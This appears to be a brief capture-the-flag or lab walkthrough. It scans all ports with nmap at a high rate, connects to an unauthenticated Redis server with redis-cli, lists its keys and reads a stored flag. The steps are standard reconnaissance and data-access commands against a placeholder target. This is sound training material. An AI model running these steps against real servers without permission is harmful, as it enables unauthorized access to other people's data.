scan the port using nmap with minimum rate 5000
sudo nmap -p- --min-rate 5000 IP__

connect to redis using redis-cli
redis-cli -h IP__

get the statistic of the database using info
IP__:port>	info

how many keys? ther's Keyspace section
# Keyspace
db0:keys=4,expires=0,avg_ttl=0


get all the keys using star sign
IP__:port>	keys *

cat the flag using get
IP__:port> get flag

